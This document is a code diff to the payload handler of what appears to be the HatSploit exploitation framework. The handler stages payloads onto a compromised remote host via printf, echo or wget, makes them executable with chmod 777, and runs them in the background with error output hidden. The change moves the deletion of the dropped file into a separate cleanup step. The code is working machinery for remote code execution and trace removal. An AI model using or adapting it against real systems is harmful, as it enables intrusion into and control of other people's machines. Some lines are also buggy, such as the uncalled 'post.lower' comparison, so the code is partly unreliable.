@@ -90,10 +90,10 @@ class Handler(TCP):
 
         self.badges.output_process("Executing payload...")
         if encode:
-            sender(*args, f"{command}; chmod 777 {path}; sh -c '{path} {payload_args}; rm {path}' 2>/dev/null &\n".encode())
+            sender(*args, f"{command}; chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &\n".encode())
         else:
-            sender(*args, f"{command}; chmod 777 {path}; sh -c '{path} {payload_args}; rm {path}' 2>/dev/null &")
-        return wget_container
+            sender(*args, f"{command}; chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &")
+        return wget_container, path
 
     def echo_stage(self, payload, sender, args=[], payload_args=None, location='/tmp', encode=False):
         self.badges.output_process("Sending payload stage...")
@@ -121,9 +121,10 @@ class Handler(TCP):
 
         self.badges.output_process("Executing payload...")
         if encode:
-            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}; rm {path}' 2>/dev/null &\n".encode())
+            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &\n".encode())
         else:
-            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}; rm {path}' 2>/dev/null &")
+            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &")
+        return path
     
     def printf_stage(self, payload, sender, args=[], payload_args=None, location='/tmp', encode=False):
         self.badges.output_process("Sending payload stage...")
@@ -151,9 +152,10 @@ class Handler(TCP):
 
         self.badges.output_process("Executing payload...")
         if encode:
-            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}; rm {path}' 2>/dev/null &\n".encode())
+            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &\n".encode())
         else:
-            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}; rm {path}' 2>/dev/null &")
+            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &")
+        return path
 
     def set_session_details(self, payload, session):
         if not session.details['Type']:
@@ -171,11 +173,11 @@ class Handler(TCP):
             session = payload['Session'] if payload['Session'] is not None else HatSploitSession
             if payload['Category'].lower() == 'stager':
                 if post.lower() == 'printf':
-                    self.printf_stage(payload['Payload'], sender, args, payload['Args'], location)
+                    path = self.printf_stage(payload['Payload'], sender, args, payload['Args'], location)
                 elif post.lower() == 'echo':
-                    self.echo_stage(payload['Payload'], sender, args, payload['Args'], location)
+                    path = self.echo_stage(payload['Payload'], sender, args, payload['Args'], location)
                 elif post.lower() == 'wget':
-                    wget_container = self.wget_stage(payload['Payload'], sender, args, payload['Args'], location)
+                    wget_container, path = self.wget_stage(payload['Payload'], sender, args, payload['Args'], location)
                 else:
                     self.output_warning("Invalid post method, using printf by default.")
                     self.printf_stage(payload['Payload'], sender, args, payload['Args'], location)
@@ -197,16 +199,18 @@ class Handler(TCP):
                     if not new_session:
                         return False
                     
+                self.badges.output_process("Cleaning up...")
+                sender(*args, f"rm {path}")
                 if post.lower == 'wget':
                     requests.delete(wget_container)
 
                 if payload['Category'].lower() == 'stager':
                     if post.lower() == 'printf':
-                        self.printf_stage(payload['Payload'], new_session.send, args, payload['Args'], location, encode=True)
+                        path = self.printf_stage(payload['Payload'], new_session.send, args, payload['Args'], location, encode=True)
                     elif post.lower() == 'echo':
-                        self.echo_stage(payload['Payload'], new_session.send, args, payload['Args'], location, encode=True)
+                        path = self.echo_stage(payload['Payload'], new_session.send, args, payload['Args'], location, encode=True)
                     elif post.lower() == 'wget':
-                        wget_container = self.wget_stage(payload['Payload'], new_session.send, args, payload['Args'], location, encode=True)
+                        wget_container, path = self.wget_stage(payload['Payload'], new_session.send, args, payload['Args'], location, encode=True)
                     else:
                         self.output_warning("Invalid post method, using printf by default.")
                         self.printf_stage(payload['Payload'], new_session.send, args, payload['Args'], location, encode=True)
@@ -236,8 +240,10 @@ class Handler(TCP):
             if not new_session and not remote_host:
                 return False
             
+        self.badges.output_process("Cleaning up...")
+        sender(*args, f"rm {path}\n".encode())
         if post.lower == 'wget':
-            requests.delete(wget_container)
+                requests.delete(wget_container)
 
         new_session = self.set_session_details(payload, new_session)
         session_platform = new_session.details['Platform']
